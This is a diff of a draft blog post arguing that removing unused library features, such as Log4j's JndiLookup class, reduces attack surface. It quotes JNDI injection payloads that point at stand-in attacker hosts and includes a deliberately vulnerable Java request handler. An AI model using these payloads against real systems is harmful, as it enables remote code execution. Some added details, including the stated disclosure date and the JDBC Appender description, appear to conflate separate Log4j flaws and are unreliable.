@@ -1,6 +1,6 @@
 ---
 layout: post
-title: Why Debloating Software Based on User Usage?
+title: Why Debloating Software Based on Client's Usages?
 subtitle: The case of the Log4j vulnerability
 tags: security
 description: TODO
@@ -13,25 +13,34 @@ keywords:
 image: ../img/posts/2022/2022-06-15/satyr-cover.jpg
 share-img: ../img/posts/2022/2022-06-15/satyr-cover.jpg
 show-avatar: false
+toc: true
 date: 2022/06/15
 author: cesarsotovalero
 published: false
 ---
 
-TODO
+Most software applications are built using third-party libraries and frameworks that together form the application's [software supply chain](../blog/the-software-supply-chain.html).
+These libraries are often large and complex pieces of engineering, with many features and functionalities to support a wide range of use cases.
+Consequently, most applications only use a small subset of these features.
+This means that the majority of the code in these libraries is unnecessary for the application's functionality.
+This excess of code can be a security risk, as it can contain dormant vulnerabilities that can be exploited.
+This article explores the benefits of [debloating software based on user usage](../blog/diversity-driven-software-debloat.html), and how it can help reduce the attack surface of applications.
+With a focus on the recent log4j security vulnerability, let's discuss how debloating could have mitigated the impact of such incident.
 
 <figure class="jb_picture">
   {% responsive_image path: img/posts/2022/2022-06-15/satyr.jpg alt:"TODO" %}
   <figcaption class="stroke"> 
-    &#169; Let's . Photo from a wooden satyr at <a href="https://goo.gl/maps/9SCooHLsZwRLTcbt6">Stockholms Centralstation</a>.
+    &#169; Let's reuse code, sit, sing, and hope for the best. Photo from a wooden satyr in <a href="https://goo.gl/maps/EjhcQKd9rBBfUTu48">Stockholm City Museum</a>.
   </figcaption>
 </figure>
 
 # The Log4j Vulnerability
 
-In December 2021, a critical vulnerability was discovered in the popular Java logging library log4j2.
+In December 29th 2021, a critical vulnerability was discovered in the popular Java logging library log4j2.
+An attacker with permission to modify the logging configuration file can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI which can execute remote code.
 The versions affected ranged [between 2.0-beta9 and 2.14.1 included](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q). 
 This vulnerability is identified by [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
+
 
 The vulnerability stemmed from the `JndiLookup` class in log4j, which allowed JNDI ([Java Naming and Directory Interface](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html#:~:text=The%20Java%20Naming%20and%20Directory,any%20specific%20directory%20service%20implementation.)) lookups. 
 When log4j is configured to log unsanitized user input, an attacker can insert a malicious string (like `${jndi:ldap://malicious.server/payload}`) which would cause log4j to initiate a JNDI lookup.
@@ -39,16 +48,60 @@ This can lead to Remote Code Execution (RCE) because certain JNDI services, like
 
 > The Java Naming and Directory Interface (JNDI) is an API that allows applications to discover and look up data and objects via a name. These objects can be anything from simple data items (like strings and numbers) to more complex network services. JNDI lookup is essentially the process of retrieving an object or piece of data bound to a particular name in a naming or directory service.
 
+The attack works as follows:
+
+1. The user sends data to the server (TCP, HTTP, or any other protocol allowing this).
+2. The server writes in the logs via log4j the data containing the malicious payload in the request: `${jndi:ldap://malicioussite.com/exploit}`, where `malicioussite.com` is an attacker-controlled server.
+3. The log4j vulnerability is triggered and the server makes a request to `malicioussite.com` via JNDI.
+4. The response contains a path to a remote Java class file, which will be injected into the server process.
+5. The injected payload allows the presumed attacker to execute arbitrary code.
+
+
+The following code represents a scenario where an attacker can exploit this vulnerability via the User Agent header of an HTTP request:
+
+```java
+/**
+* A simple HTTP handler that will process HTTP requests and logs it back.
+*/
+public class VulnerableLog4jExampleHandler implements HttpHandler {
+
+  static Logger log = Logger.getLogger(log4jExample.class.getName());
+
+  /**
+   * A simple HTTP endpoint that reads the request's User Agent and logs it back.
+   * @param he HTTP Request Object
+   */
+  public void handle(HttpExchange he) throws IOException {
+    // The User Agent from the HTTP request is retrieved and stored in the userAgent variable.
+    string userAgent = he.getRequestHeader("user-agent");
+    // Logging the User Agent, this is where the exploit occurs.
+    // If an attacker sends a malicious payload like ${jndi:ldap://attacker.com/a} as the User Agent,
+    // log4j will try to resolve this expression, leading to a remote code execution (RCE) vulnerability.
+    log.info("Request User Agent:" + userAgent);
+    // A response is then generated, echoing back the User Agent within an HTML message and a 200 OK status.
+    String response = "<h1>Hello There, " + userAgent + "!</h1>";
+    he.sendResponseHeaders(200, response.length());
+    OutputStream os = he.getResponseBody();
+    os.write(response.getBytes());
+    os.close();
+  }
+}
+```
+
 Because log4j is ubiquitously used in Java applications, this vulnerability was particularly alarming.
 The impact was widespread, affecting countless systems, and required immediate patching. 
 A patch (2.15.0) was swiftly released by the Apache Logging team that removed the vulnerable feature, and many organizations rushed to update their log4j versions or implement mitigations like JVM flags or firewall rules.
 
+<figure class="jb_picture">
+  {% responsive_image path: img/posts/2022/2022-06-15/log4j_attack.png alt:"The log4j JNDI attack and how to prevent it." %}
+  <figcaption class="stroke"> 
+    Fig 1. The log4j JNDI attack (in black) and how to prevent it (in red). Image source: <a href="https://www.govcert.admin.ch/">Swiss Government Computer Emergency Response Team</a>.
+  </figcaption>
+</figure>
+
 Apart from the direct RCE exploit, this vulnerability also opened up doors to other attack vectors like Denial of Service (DoS) via extremely resource-intensive JNDI lookups, or Information Disclosure as the malicious server can capture IP addresses of the servers making the lookup.
 
 This incident also highlighted the importance of being cautious when parsing and logging untrusted input, and emphasized the need for regular security reviews of even well-established and trusted libraries in the software ecosystem.
-
-https://www.infoq.com/news/2021/12/log4j-zero-day-vulnerability/
-https://logging.apache.org/log4j/2.x/security.html
 
 # Does Debloating Helps?
 
@@ -69,6 +122,7 @@ Many applications that used log4j didn't even require the `JndiLookup` functiona
 However, since this feature was present in the library, and the library was integrated into their applications, they became vulnerable.
 If this feature had been removed or wasn't a part of the version of the library they were using, the vulnerability would have had no impact on them, even if the flaw still existed in the code of the broader log4j project.
 
+Where an upgrade is not immediately possible, an alternative mitigation option is to remove the JndiLookup class from the classpath.
 If an organization had debloated their version of log4j, removing features and components they didn't use, including the `JndiLookup` class, they would have naturally been immune to this particular vulnerability.
 This example underscores the principle that removing or disabling unnecessary components can reduce the potential points of failure or exploitation in software.
 
@@ -102,8 +156,8 @@ It emphasizes the security benefits of minimizing code and features to only what
 
 # References
 
-- TODO
-- TODO
-- TODO
+- [Vulnerability Affecting Multiple Log4j Versions Permits RCE Exploit](https://www.infoq.com/news/2021/12/log4j-zero-day-vulnerability/)
+- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html#fixed-in-log4j-2-15-0-java-8)
+- [Zero-Day Exploit Targeting Popular Java Library Log4j](https://www.govcert.admin.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)
 
 
